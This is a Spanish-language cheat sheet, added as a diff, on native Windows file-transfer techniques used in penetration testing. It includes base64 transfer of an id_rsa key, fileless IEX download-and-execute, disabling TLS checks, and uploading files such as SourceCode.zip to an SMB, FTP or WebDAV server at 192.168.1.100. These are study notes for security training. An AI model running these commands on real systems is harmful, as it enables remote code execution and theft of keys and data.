@@ -1,0 +1,215 @@
+# Windows File Transfer Methods
+
+Windows tiene múltiples herramientas nativas para transferencia de archivos.
+
+## PowerShell Base64 Encode & Decode
+
+### Descargar archivo (Linux → Windows)
+
+**En Linux:**
+
+```bash
+# Verificar hash del archivo original
+md5sum id_rsa
+
+# Codificar a base64
+cat id_rsa | base64 -w 0; echo
+```
+
+**En Windows PowerShell:**
+
+```powershell
+# Decodificar base64 a archivo
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64_STRING"))
+
+# Verificar hash
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+```
+
+### Subir archivo (Windows → Linux)
+
+**En Windows PowerShell:**
+
+```powershell
+# Codificar archivo a base64
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+
+# Verificar hash
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5
+```
+
+**En Linux:**
+
+```bash
+# Decodificar base64
+echo "BASE64_STRING" | base64 -d > hosts
+
+# Verificar hash
+md5sum hosts
+```
+
+**Limitaciones:**
+- cmd.exe tiene máximo 8,191 caracteres
+- Web shells pueden fallar con strings largos
+
+## PowerShell Web Downloads
+
+### WebClient Class
+
+```powershell
+# DownloadFile
+(New-Object Net.WebClient).DownloadFile('https://example.com/file.ps1', 'C:\Users\Public\file.ps1')
+
+# DownloadFileAsync
+(New-Object Net.WebClient).DownloadFileAsync('https://example.com/file.ps1', 'C:\Users\Public\file.ps1')
+
+# DownloadString (fileless)
+IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
+```
+
+### Invoke-WebRequest (PowerShell 3.0+)
+
+```powershell
+# Descargar archivo
+Invoke-WebRequest https://example.com/file.ps1 -OutFile file.ps1
+
+# Alias
+wget https://example.com/file.ps1 -OutFile file.ps1
+curl https://example.com/file.ps1 -OutFile file.ps1
+iwr https://example.com/file.ps1 -OutFile file.ps1
+```
+
+### Errores Comunes
+
+**Error IE First-Run:**
+
+```powershell
+# Solución: usar -UseBasicParsing
+Invoke-WebRequest https://example.com/file.ps1 -UseBasicParsing | IEX
+```
+
+**Error SSL/TLS:**
+
+```powershell
+# Ignorar errores de certificado
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+
+## SMB Downloads
+
+### Crear servidor SMB (Linux)
+
+```bash
+# Sin autenticación
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+# Con usuario y contraseña
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+### Descargar en Windows
+
+```cmd
+# Sin autenticación
+copy \\192.168.1.100\share\file.txt
+
+# Con autenticación
+net use n: \\192.168.1.100\share /user:test test
+copy n:\file.txt
+```
+
+**Nota:** Windows moderno bloquea acceso anónimo por defecto.
+
+## FTP Downloads
+
+### Crear servidor FTP (Linux)
+
+```bash
+# Instalar
+sudo pip3 install pyftpdlib
+
+# Iniciar servidor anónimo
+sudo python3 -m pyftpdlib --port 21
+
+# Con permisos de escritura
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+### Descargar en Windows
+
+```powershell
+# Con PowerShell
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.1.100/file.txt', 'C:\Users\Public\file.txt')
+```
+
+### FTP desde cmd (no interactivo)
+
+```cmd
+echo open 192.168.1.100 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+
+## Upload Operations
+
+### PowerShell Web Upload
+
+**Servidor (Linux):**
+
+```bash
+pip3 install uploadserver
+python3 -m uploadserver
+```
+
+**Cliente (Windows):**
+
+```powershell
+# Descargar script de upload
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+# Subir archivo
+Invoke-FileUpload -Uri http://192.168.1.100:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+### SMB Upload
+
+**Con impacket-smbserver:**
+
+```cmd
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.1.100\share\
+```
+
+### WebDAV Upload
+
+**Servidor (Linux):**
+
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+**Cliente (Windows):**
+
+```cmd
+dir \\192.168.1.100\DavWWWRoot
+copy C:\file.txt \\192.168.1.100\DavWWWRoot\
+```
+
+### FTP Upload
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.1.100/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+## Resumen de Métodos
+
+| Método | Puerto | Uso |
+|--------|--------|-----|
+| HTTP/HTTPS | 80/443 | Download/Upload |
+| SMB | 445 | Download/Upload |
+| FTP | 21/20 | Download/Upload |
+| WebDAV | 80/443 | Download/Upload |
+| Base64 | N/A | Clipboard transfer |
